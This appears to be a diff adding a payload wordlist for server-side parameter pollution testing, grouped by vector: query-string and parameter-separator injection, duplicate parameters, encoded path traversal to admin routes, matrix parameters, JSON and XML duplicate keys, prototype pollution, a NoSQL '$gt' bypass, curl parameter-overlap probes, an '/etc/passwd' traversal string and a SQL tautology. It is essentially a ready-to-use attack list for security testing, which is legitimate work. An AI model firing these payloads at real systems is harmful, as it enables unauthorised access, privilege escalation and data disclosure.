@@ -1,0 +1,87 @@
+# SSP Payloads — Server-Side Parameter Pollution
+# Organized by vector: query string, REST path, structured data, parameter space
+
+# ── Query String Pollution ──
+# Fragment injection
+value#fragment
+value%23fragment
+# Parameter separator injection
+value&injected=true
+value%26injected=true
+# Question mark injection (truncates in some parsers)
+value?newparam=test
+value%3Fnewparam=test
+# Equals injection
+value%3Dtest
+# Null-byte injection
+value%00admin=true
+
+# ── HTTP Parameter Pollution (HPP) ──
+# Duplicate params (different parsers handle differently)
+id=1&id=2
+id[]=1&id[]=2
+# Array notation variants
+id[0]=1&id[1]=2
+id=1,2
+# Space-to-plus confusion
+id=1+2
+
+# ── REST Path Pollution ──
+# Path traversal in REST URL parameters
+%2F..%2Fadmin
+%2F..%2F..%2Fadmin
+..%2Fadmin
+..;/admin
+%00/admin
+# URL encoding tricks for path segments
+%2e%2e/admin
+%2e%2e%2fadmin
+..%252fadmin
+# Matrix parameter injection (Java/JAX-RS)
+;admin=true
+;role=admin/orders
+;.js  (extension confusion)
+# Encoded slashes in path segments
+%2Fadmin%2Fconfig
+
+# ── Structured Data Pollution (JSON) ──
+# Duplicate keys
+{"id":1,"id":2}
+{"id":1,"id":2,"id":3}
+# Type juggling
+{"id":"1"}
+{"id":1.0}
+{"id":[1]}
+{"id":[1,2,3]}
+{"id":{"$gt":""}}
+{"id":null}
+{"id":true}
+# Nested parameter injection
+{"user":{"id":1,"role":"admin"}}
+{"__proto__":{"role":"admin"}}
+{"constructor":{"prototype":{"role":"admin"}}}
+
+# ── Structured Data Pollution (XML) ──
+# Duplicate elements
+<user><id>1</id><id>2</id></user>
+# Attribute injection
+<user id="1" role="admin"/>
+# Structured injection
+<user><id>1</id><role>admin</role></user>
+
+# ── Parameter Space Overlap ──
+# These are tested by sending the SAME param in different locations
+# Use: curl -X POST "URL?param=query_value" -d '{"param":"body_value"}'
+# Use: curl "URL?param=victim" -H "X-Param: admin"
+# Use: curl "URL/path_value?param=query_value"
+
+# ── Verbose Error Provocation ──
+# Type confusion (string where number expected)
+notanumber
+99999999999999999999
+-1
+../../../etc/passwd
+# Empty values
+EMPTY
+# Special characters
+' OR '1'='1
